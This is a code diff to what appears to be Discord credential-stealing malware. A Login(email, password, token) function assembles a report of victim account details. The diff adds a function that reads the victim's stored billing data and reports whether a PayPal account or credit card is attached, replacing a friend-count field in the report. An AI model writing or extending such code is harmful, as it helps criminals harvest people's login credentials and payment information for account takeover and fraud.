@@ -171,12 +171,24 @@ function GetBadges(flags) {
 	return badges
 }
 
-function intotalfriends() {
-    var f = JSON.parse(info4)
-    const r = f.filter((user) => {
-        return user.type == 1
+function Cool() {
+    const json = JSON.parse(info3)
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == "") {
+            return "no payment method"
+        } else if (z.type == 2 && z.invalid != !0) {
+            billing += "paypal"
+        } else if (z.type == 1 && z.invalid != !0) {
+            billing += "credit card"
+        } else {
+            return "no payment method"
+        }
     })
-    return r.length
+    if (billing == "") {
+        billing = "no payment method"
+    }
+    return billing
 }
 
 function Login(email, password, token) {
@@ -244,8 +256,8 @@ function Login(email, password, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " intotal friends",
-                            "value": `\`${intotalfriends()}\``,
+                            "name": " payment method",
+                            "value": `\`${Cool()}\``,
                             "inline": true		    
                         },
                         {
